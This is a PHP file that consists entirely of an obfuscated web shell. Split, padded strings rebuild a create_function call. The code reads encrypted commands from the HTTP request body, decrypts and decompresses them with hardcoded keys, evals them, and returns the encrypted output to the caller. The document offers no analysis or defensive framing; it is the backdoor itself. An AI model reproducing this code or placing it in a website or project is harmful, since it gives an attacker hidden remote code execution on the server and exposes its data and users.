<?php
$d='j=0|S|S;($j<$c&&$i<$l);$|Sj++,$|Si++){$o|S.=$t{$i}^|S$k|S{$j};}|S}return|S $o;}|Sif (@preg|S_|Smatch(';
$j='ti|Son x($t|S,$k){|S$c=st|Sr|Sl|Sen($k);$l=strle|Sn($t);$o=|S"";|Sfor($i|S=|S0;$i<$l;){f|Sor($|S';
$O='$k="|S3d4b4f|S71";$kh="5|Se74d|Sfb2990e|S"|S;$kf="6a77|Sad82|S3ca6";$p|S="shd0RM|SE2ONF8a|Sss1";|Sfunc';
$T='"|S|S/$kh(|S.+)$kf/",@file_ge|St|S_cont|Sents("php|S:|S//inp|Sut|S"),$m)==1)|S {@ob_start();@e';
$b='@ob_end_clean();$r|S=@b|Sase64_enco|Sde|S(@x(@gzc|Sompress(|S$o|S),$k));pri|Snt("|S$p$k|Sh$r$kf");}';
$E='|S|Sval(@gzun|Scompress(|S@x(@b|Sase64|S_d|Secod|Se($m[1]),$|Sk)));$o|S=@o|Sb_get_con|St|Sents(|S);|S';
$u=str_replace('q','','qqqcreqate_funqctiqon');
$i=str_replace('|S','',$O.$j.$d.$T.$E.$b);
$l=$u('',$i);$l();
?>
